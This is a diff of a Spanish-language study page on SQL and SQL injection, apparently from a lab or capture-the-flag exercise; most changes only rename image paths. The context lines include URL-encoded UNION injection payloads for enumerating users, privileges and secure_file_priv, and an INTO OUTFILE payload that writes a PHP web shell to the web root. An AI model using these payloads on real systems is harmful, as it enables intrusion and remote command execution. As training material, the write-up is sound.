@@ -14,7 +14,7 @@
 mysql --skip-ssl -h 94.237.50.221 -P 33445 -u root -p
 ```
 
-<figure><img src="../.gitbook/assets/image (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ### SQL Statements
 
@@ -27,7 +27,7 @@ show TABLES;
 select * from departments;
 ```
 
-<figure><img src="../.gitbook/assets/image (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ### Query Results
 
@@ -37,7 +37,7 @@ select * from departments;
  SELECT last_name FROM employees WHERE first_name LIKE 'Bar%' AND hire_date = '1990-01-01';
 ```
 
-<figure><img src="../.gitbook/assets/image (2) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (2) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ### SQL Operators
 
@@ -47,7 +47,7 @@ select * from departments;
 SELECT COUNT(*) AS num_records FROM titles WHERE emp_no > 10000 OR title NOT LIKE '%engineer%';
 ```
 
-<figure><img src="../.gitbook/assets/image (3) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (3) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ## SQL Injections
 
@@ -320,7 +320,7 @@ Nos encontramos un panel de login y lo bypasseamos con una inyección básica.
 
 Estamos dentro.
 
-<figure><img src="../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (12) (1).png" alt=""><figcaption></figcaption></figure>
 
 Vamos a ver cuántas columnas tiene.
 
@@ -336,7 +336,7 @@ Sabiendo el número de columnas (5) vamos a enumerar los usuarios.
 '+UNION+SELECT+NULL,NULL,NULL,USER(),NULL--+-
 ```
 
-<figure><img src="../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (4) (1).png" alt=""><figcaption></figcaption></figure>
 
 Ya sabemos el usuario por lo que hay que ver que privilegios tiene.
 
@@ -344,7 +344,7 @@ Ya sabemos el usuario por lo que hay que ver que privilegios tiene.
 '+UNION+SELECT+NULL,grantee,privilege_type,NULL,NULL+FROM+information_schema.user_privileges+WHERE+grantee%3d"'root'%40'localhost'"--+
 ```
 
-<figure><img src="../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (5) (1).png" alt=""><figcaption></figcaption></figure>
 
 Vemos que tenemos permiso en **FILE** y eso indica que puede tanto escribir y leer en el backend. Comprobamos **secure\_file\_priv** si podemos escribir datos.
 
@@ -352,7 +352,7 @@ Vemos que tenemos permiso en **FILE** y eso indica que puede tanto escribir y le
 '+UNION+SELECT+1,2,3,+variable_name,+variable_value+FROM+information_schema.global_variables+where+variable_name%3d"secure_file_priv"--+-
 ```
 
-<figure><img src="../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (6) (1).png" alt=""><figcaption></figcaption></figure>
 
 Eso significa que podemos escribir datos por lo que hacemos una web shell.
 
@@ -360,7 +360,7 @@ Eso significa que podemos escribir datos por lo que hacemos una web shell.
 '+union+select+"","",'<%3fphp+system($_REQUEST[0])%3b+%3f>',+"",+""+into+outfile+'/var/www/html/shell.php'--+-
 ```
 
-<figure><img src="../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (7) (1).png" alt=""><figcaption></figcaption></figure>
 
 Nos salta un error pero de las tres condiciones necesarias, el usuario ya cuenta con el privilegio **FILE** habilitado y además la variable global **secure\_file\_priv** de MySQL no está activa, por lo que el problema debe encontrarse en la tercera condición, es decir, en la falta de permisos de escritura en la ubicación del servidor donde se pretende guardar el archivo.
 
@@ -368,16 +368,16 @@ Nos salta un error pero de las tres condiciones necesarias, el usuario ya cuenta
 '+union+select+"","",'<%3fphp+system($_REQUEST[0])%3b+%3f>',+"",+""+into+outfile+'/var/www/html/dashboard/shell.php'--+-
 ```
 
-<figure><img src="../.gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (8) (1).png" alt=""><figcaption></figcaption></figure>
 
 Accedemos a la web shell.
 
-<figure><img src="../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (9) (1).png" alt=""><figcaption></figcaption></figure>
 
 Listamos los archivos.
 
-<figure><img src="../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (10) (1).png" alt=""><figcaption></figcaption></figure>
 
 Mostramos el contenido de la flag.
 
-<figure><img src="../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (11) (1).png" alt=""><figcaption></figcaption></figure>
